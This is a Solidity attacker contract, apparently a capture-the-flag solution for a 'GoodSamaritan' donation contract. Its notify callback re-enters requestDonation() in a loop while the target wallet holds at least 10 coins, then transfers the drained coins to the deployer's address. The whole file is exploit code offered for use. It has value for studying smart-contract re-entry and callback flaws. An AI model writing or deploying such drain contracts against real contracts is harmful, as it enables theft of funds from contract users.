pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
    function wallet() external view returns (address);
}


interface IWallet {
    function coin() external view returns (address);
}



interface ICoin {
    function balances(address) external view returns (uint256);
    function transfer(address dest_, uint256 amount_) external;
}


contract FinalAttacker {
    IGoodSamaritan public goodSamaritan;
    IWallet public wallet;
    ICoin public coin;
    address public owner;

    constructor(address goodSamaritanAddress) {
        owner = msg.sender;
        goodSamaritan = IGoodSamaritan(goodSamaritanAddress);
        address walletAddress = goodSamaritan.wallet();
        wallet = IWallet(walletAddress);
        coin = ICoin(wallet.coin());
    }

    function notify(uint256 _amount) external {
        while (coin.balances(address(wallet)) >= 10) {
            (bool success, ) = address(goodSamaritan).call(abi.encodeWithSignature("requestDonation()"));
            require(success, "Call failed");
        }
        uint256 attackerBalance = coin.balances(address(this));
        if (attackerBalance > 0) {
            coin.transfer(owner, attackerBalance);
        }
    }

    function retrigger() external {
        (bool success, ) = address(goodSamaritan).call(abi.encodeWithSignature("requestDonation()"));
        require(success, "Call failed");
    }
}